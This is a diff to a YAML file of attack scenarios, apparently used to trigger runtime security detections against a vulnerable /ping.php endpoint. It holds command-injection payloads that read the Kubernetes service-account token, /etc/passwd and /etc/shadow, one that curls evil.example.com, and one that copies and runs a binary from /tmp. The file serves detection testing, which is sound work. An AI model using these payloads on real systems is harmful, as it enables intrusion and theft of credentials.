@@ -21,7 +21,7 @@ attacks:
       method: GET
       path: /ping.php
       queryParams:
-        ip: "1.1.1.1;cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+        ip: "127.0.0.1;cat /var/run/secrets/kubernetes.io/serviceaccount/token"
     successIndicators:
       - bodyContains: "eyJ"
 
@@ -31,7 +31,7 @@ attacks:
       method: GET
       path: /ping.php
       queryParams:
-        ip: "1.1.1.1;cat /etc/passwd"
+        ip: "127.0.0.1;cat /etc/passwd"
     successIndicators:
       - bodyContains: "root:"
 
@@ -41,7 +41,7 @@ attacks:
       method: GET
       path: /ping.php
       queryParams:
-        ip: "1.1.1.1;whoami"
+        ip: "127.0.0.1;whoami"
     successIndicators:
       - bodyContains: "www-data"
 
@@ -51,7 +51,7 @@ attacks:
       method: GET
       path: /ping.php
       queryParams:
-        ip: "1.1.1.1;ls /var/run/secrets/kubernetes.io/serviceaccount/"
+        ip: "127.0.0.1;ls /var/run/secrets/kubernetes.io/serviceaccount/"
     successIndicators:
       - bodyContains: "token"
 
@@ -64,7 +64,7 @@ attacks:
       method: GET
       path: /ping.php
       queryParams:
-        ip: "1.1.1.1;cat /etc/shadow || true"
+        ip: "127.0.0.1;cat /etc/shadow || true"
     successIndicators:
       - statusCode: 200  # file open triggers R0010 even if read fails (www-data can't read shadow)
 
@@ -77,7 +77,7 @@ attacks:
       method: GET
       path: /ping.php
       queryParams:
-        ip: "1.1.1.1;curl -sm2 http://evil.example.com || true"
+        ip: "127.0.0.1;curl -sm1 http://evil.example.com || true"
     successIndicators:
       - statusCode: 200
 
@@ -92,7 +92,7 @@ attacks:
       method: GET
       path: /ping.php
       queryParams:
-        ip: "1.1.1.1;cp /bin/ls /tmp/drifted && /tmp/drifted /etc || true"
+        ip: "127.0.0.1;cp /bin/ls /tmp/drifted && /tmp/drifted /etc || true"
     successIndicators:
       - statusCode: 200
 
